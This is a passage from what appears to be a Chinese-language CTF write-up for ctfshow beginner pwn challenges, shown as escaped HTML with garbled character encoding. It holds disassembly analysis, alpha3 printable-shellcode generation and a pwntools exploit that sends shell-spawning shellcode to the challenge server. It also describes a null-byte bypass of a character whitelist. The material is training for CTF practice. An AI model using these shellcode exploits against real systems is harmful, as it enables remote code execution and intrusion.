&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;00000000000011&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;E9&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;jle&lt;/span&gt;     &lt;span class=&#34;nv&#34;&gt;short&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;loc_11FC&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;å­—ç¬¦â‰¤&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x40&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;â†’&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;è¿›å…¥ä¸‹ä¸€è½®æ ¡éªŒ&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;00000000000011&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;F8&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;cmp&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;al&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;5Ah&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; &amp;#39;Z&amp;#39;  // è¾¹ç•Œ2ï¼š0x5A&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;00000000000011&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;FA&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;jle&lt;/span&gt;     &lt;span class=&#34;nv&#34;&gt;short&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;loc_1236&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;å­—ç¬¦â‰¤&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x5A&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;â†’&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;é€šè¿‡æ ¡éªŒ&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;3.ç¬¬ä¸‰ç»„èŒƒå›´æ ‡è¯†ï¼šå…è®¸ &lt;code&gt;0x2F~0x3F&lt;/code&gt;ï¼ˆå¯¹åº” ASCII &amp;lsquo;/&amp;rsquo;~&amp;rsquo;?&amp;rsquo;ï¼‰&lt;/p&gt;
&lt;p&gt;å¯¹åº”ä»£ç æ®µï¼ˆ&lt;code&gt;loc_11FC&lt;/code&gt;è‡³&lt;code&gt;loc_1236&lt;/code&gt;ï¼‰ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;0000000000001209&lt;/span&gt;                 &lt;span class=&#34;nf&#34;&gt;cmp&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;al&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;2Fh&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; &amp;#39;/&amp;#39;  // è¾¹ç•Œ1ï¼š0x2F&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;000000000000120&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;B&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;jle&lt;/span&gt;     &lt;span class=&#34;nv&#34;&gt;short&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;loc_121E&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;å­—ç¬¦â‰¤&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x2F&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;â†’&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;é”™è¯¯ï¼ˆé€€å‡ºï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;000000000000121&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;A&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;cmp&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;al&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;5Ah&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; &amp;#39;Z&amp;#39;  // è¾¹ç•Œ2ï¼š0x5A&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;000000000000121&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;jle&lt;/span&gt;     &lt;span class=&#34;nv&#34;&gt;short&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;loc_1236&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;å­—ç¬¦â‰¤&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x5A&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;â†’&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;é€šè¿‡æ ¡éªŒ&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;ç»¼ä¸Šï¼šè¿™æ®µæ±‡ç¼–é€šè¿‡ &lt;strong&gt;&lt;code&gt;cmp al, 60h&lt;/code&gt;ã€&lt;code&gt;cmp al, 7Ah&lt;/code&gt;ã€&lt;code&gt;cmp al, 40h&lt;/code&gt;ã€&lt;code&gt;cmp al, 5Ah&lt;/code&gt;ã€&lt;code&gt;cmp al, 2Fh&lt;/code&gt;&lt;/strong&gt; è¿™ 5 å¤„&lt;code&gt;cmp&lt;/code&gt;æŒ‡ä»¤ï¼Œæ˜ç¡®æ ‡è¯†äº†è¾“å…¥å­—ç¬¦çš„å…è®¸èŒƒå›´ï¼ˆ&lt;code&gt;0x2F~0x5A&lt;/code&gt; æˆ– &lt;code&gt;0x60~0x7A&lt;/code&gt;ï¼‰ã€‚å…¶å®å°±æ˜¯è¦æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦éƒ½æ˜¯å¯æ‰“å°å­—ç¬¦ï¼Œshellcode æœ‰äº›æ˜¯ä¸å¯æ‰“å°å­—ç¬¦ï¼Œè¿™ä¸ªå«&lt;strong&gt;string.printable&lt;/strong&gt;ï¼Œå°±æ˜¯å¯è§å­—shellcodeã€‚è¿™é‡Œä½¿ç”¨&lt;code&gt;alpha3&lt;/code&gt;å°±å¯ä»¥ç”Ÿæˆäº†:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git clone https://github.com/TaQini/alpha3.git
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;åˆšå¥½pwntoolsçš„shellcodeæ˜¯æœ‰ä¸å¯æ‰“å°çš„å­—ç¬¦ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;asm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcraft&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;code&gt;jhh///sh/bin\x89ï¿½h\x814$ri1ï¿½Qj\x04ï¿½Qï¿½ï¿½1ï¿½j\x0bÍ€&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/218.png&#34;
	width=&#34;871&#34;
	height=&#34;55&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/218_hu_dead02297c5d775a.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/218_hu_ea0a8deb66a09465.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;shellcodeæœ‰ä¹±ç &#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1583&#34;
		data-flex-basis=&#34;3800px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å°†shellcodeé‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ åˆ‡æ¢åˆ°alpha3ç›®å½•ä¸­ï¼Œä½¿ç”¨alpha3ç”Ÿæˆstring.printable:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;cd&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;alpha3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;python&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;./&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ALPHA3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;py&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x64&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ascii&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mixedcase&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rax&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;å­˜å‚¨shellcodeçš„æ–‡ä»¶&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;è¾“å‡º&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;æ–‡ä»¶&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;æŠŠè¾“å‡ºçš„shellcodeå¯è§å­—ç¬¦ä¸²ç²˜è´´åˆ°expä¸Šçš„å˜é‡ã€‚&lt;/p&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;amd64&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#io = process(&amp;#39;./pwn&amp;#39;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28125&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Shellcode&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;pwn_066&#34;&gt;PWN_066
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šç®€å•çš„shellcodeï¼Ÿä¸å¯¹åŠ²ï¼Œååˆ†å¾—æœ‰åäºŒåˆ†çš„ä¸å¯¹åŠ²ã€‚ &lt;a class=&#34;link&#34; href=&#34;PWN_066&#34; &gt;PWN_066&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;checksecã€IDA64åˆ†æï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/223.png&#34;
	width=&#34;743&#34;
	height=&#34;360&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/223_hu_afd71517e93ebe2c.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/223_hu_dbb097a6028a9ea3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;mainå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;206&#34;
		data-flex-basis=&#34;495px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;çœ‹åˆ°äº†ç†Ÿæ‚‰çš„mmapå‡½æ•°ï¼›bufå­˜åœ¨æº¢å‡ºç‚¹ï¼Œå¾€bufé‡Œå†™å…¥shellcodeï¼Œç„¶åç¨‹åºä¼šæ‰§è¡Œshellcodä½†æ˜¯æœ‰ä¸€ä¸ªcheckå‡½æ•°ï¼Œè·Ÿè¿›æŸ¥çœ‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/234.png&#34;
	width=&#34;621&#34;
	height=&#34;288&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/234_hu_32b208621f405438.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/234_hu_6044adf69ba41af8.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;215&#34;
		data-flex-basis=&#34;517px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;check&lt;/code&gt;å‡½æ•°çš„ä½œç”¨æ˜¯ï¼šéªŒè¯è¾“å…¥å­—ç¬¦ä¸²a1ä¸­çš„æ¯ä¸ªå­—ç¬¦æ˜¯å¦éƒ½å±äº&lt;code&gt;unk_400F20&lt;/code&gt;æŒ‡å‘çš„å…è®¸å­—ç¬¦é›†ã€‚&lt;/p&gt;
&lt;p&gt;ç»§ç»­è·Ÿè¿›unk_400F20ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/235.png&#34;
	width=&#34;899&#34;
	height=&#34;560&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/235_hu_3dec90b968dc9972.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/235_hu_34c6842586e5580d.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;unk_400F20&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;160&#34;
		data-flex-basis=&#34;385px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/236.png&#34;
	width=&#34;729&#34;
	height=&#34;475&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/236_hu_32f8ca70634168cf.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/236_hu_a1d682be0ebede7.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;shift &amp;#43; e&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;153&#34;
		data-flex-basis=&#34;368px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬è¾“å…¥çš„shellcodeçš„æ¯ä¸€ä½å­—ç¬¦è¦åœ¨unk_400F20ä¸­ï¼Œæ£€æŸ¥çš„æ—¶å€™*j==0ä¼šé€€å‡ºï¼Œå¯ä»¥ä½¿ç”¨\x00æ¥çªç ´ç¨‹åºé˜Ÿshellcodeçš„&lt;code&gt;å­—ç¬¦ç™½åå•æ ¡éªŒ&lt;/code&gt;ï¼›è€Œå¸¸è§„çš„&lt;code&gt;shellcraft.sh()&lt;/code&gt;ç”Ÿæˆçš„ shellcode åŒ…å«å¤§é‡ç™½åå•å¤–å­—ç¬¦ï¼ˆå¦‚&lt;code&gt;\x3b&lt;/code&gt;ã€&lt;code&gt;\x0f&lt;/code&gt;ç­‰ï¼‰ï¼Œæ— æ³•ç›´æ¥é€šè¿‡æ ¡éªŒï¼Œå› æ­¤å¿…é¡»ç»•è¿‡ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚ä½•ç»•è¿‡ä»checkå‡½æ•°ä¸‹æ‰‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/237.png&#34;
	width=&#34;620&#34;
	height=&#34;281&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/237_hu_3dfef3f5acc20542.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/237_hu_113bba7bb71263d7.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;çªç ´ç‚¹&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;220&#34;
		data-flex-basis=&#34;529px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;çœ‹åˆ°è¿™é‡Œä½ ä¼šå‘ç°whileé‡Œé¢æ˜¯ä¸€ä¸ª&lt;code&gt;a1&lt;/code&gt;å‚æ•°ï¼Œå¦‚æœæˆ‘è®©a1 == 0ï¼Œwhileçš„å¾ªç¯æ¡ä»¶ä¸æˆç«‹ï¼Œç›´æ¥é€€å‡ºå¾ªç¯ã€‚&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥expï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
